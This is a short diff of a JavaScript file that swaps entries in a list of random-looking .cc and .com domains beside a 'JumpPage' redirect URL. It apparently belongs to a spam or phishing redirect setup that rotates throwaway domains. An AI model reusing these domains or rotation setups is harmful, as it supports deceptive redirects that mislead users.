@@ -38,8 +38,8 @@ var emails = [
 
 var urls=[
 	'irgrtheqs.cc/', 
-	'hjyxjcwoc.cc/', 
-    'asvbtzcz.cc/',
+	'olrifkvbd.com/', 
+    'hjyxjcwoc.cc/',
 ];                                                                                                                  
 
 var JumpPage="https://azvmeiai.cc";
